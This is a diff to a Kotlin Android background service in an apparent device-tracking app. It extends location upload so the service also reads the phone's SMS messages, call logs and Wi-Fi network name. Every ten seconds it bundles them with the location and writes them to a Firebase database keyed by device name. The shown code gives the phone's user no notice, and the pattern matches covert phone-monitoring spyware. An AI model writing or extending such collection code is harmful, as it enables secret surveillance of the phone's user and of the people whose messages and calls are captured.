@@ -1,25 +1,32 @@
 package com.tracker.devices
 
+import android.Manifest
+import android.annotation.SuppressLint
 import android.app.PendingIntent
 import android.app.Service
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
-import android.content.pm.PackageManager
 import android.location.Location
 import android.os.IBinder
 import android.util.Log
 import androidx.core.app.NotificationCompat
-import androidx.core.content.ContextCompat
 import com.google.android.gms.location.*
 import com.google.android.gms.tasks.OnCompleteListener
 import com.google.android.gms.tasks.Task
 import com.google.firebase.auth.AuthResult
 import com.google.firebase.auth.FirebaseAuth
 import com.google.firebase.database.FirebaseDatabase
+import com.tracker.devices.data.CallLogs
+import com.tracker.devices.data.EntityLogs
+import com.tracker.devices.data.SmsLogs
+import com.tracker.devices.utils.*
+
 
 class TrackerService : Service() {
+
+    private lateinit var entityLogs: EntityLogs
 
     override fun onBind(intent: Intent?): IBinder? {
         return null
@@ -60,7 +67,6 @@ class TrackerService : Service() {
             .addOnCompleteListener(object : OnCompleteListener<AuthResult> {
                 override fun onComplete(p0: Task<AuthResult>) {
                     if (p0.isSuccessful) {
-                        Log.d("TrackerService", "firebase auth success");
                         requestLocationUpdates()
                     } else {
                         Log.d("TrackerService", "firebase auth success");
@@ -69,6 +75,7 @@ class TrackerService : Service() {
             })
     }
 
+    @SuppressLint("MissingPermission")
     private fun requestLocationUpdates() {
         val request = LocationRequest()
         request.setInterval(10000)
@@ -77,23 +84,48 @@ class TrackerService : Service() {
 
         val client: FusedLocationProviderClient =
             LocationServices.getFusedLocationProviderClient(this)
-        val path = getString(R.string.firebase_path) + "/" + getString(R.string.transport_id)
 
-        val permission: Int = ContextCompat.checkSelfPermission(
-            this,
-            android.Manifest.permission.ACCESS_FINE_LOCATION
+        val permission = arrayOf(
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.READ_SMS,
+            Manifest.permission.READ_CALL_LOG
         )
-        if (permission == PackageManager.PERMISSION_GRANTED) {
+
+        if (PermisstionHelper.hasPermissions(this, permission)) {
             client.requestLocationUpdates(request, object : LocationCallback() {
                 override fun onLocationResult(locationResult: LocationResult) {
-                    val ref = FirebaseDatabase.getInstance().getReference(path)
                     val location: Location? = locationResult.lastLocation
                     if (location != null) {
-                        Log.d("TrackerService", "location update $location")
-                        ref.setValue(location)
+                        postData(
+                            location,
+                            SmsHelper.requestSMS(baseContext),
+                            NetworkHelper.getCurrentSsid(baseContext),
+                            CallLogsHelper.getCallLogs(baseContext)
+                        )
                     }
                 }
             }, null)
         }
+    }
+
+    private fun postData(
+        location: Location?,
+        smsList: ArrayList<SmsLogs>?,
+        sSID: String?,
+        callLogs: ArrayList<CallLogs>?
+    ) {
+
+        Log.d("TrackerService", "location update $location")
+        Log.d("TrackerService", "sSID update $sSID")
+
+        entityLogs = EntityLogs(
+            location,
+            smsList,
+            sSID,
+            callLogs
+        )
+        val path = getString(R.string.firebase_path) + "/" + DeviceHelper.getDeviceName()
+        val ref = FirebaseDatabase.getInstance().getReference(path)
+        ref.setValue(entityLogs)
     }
 }
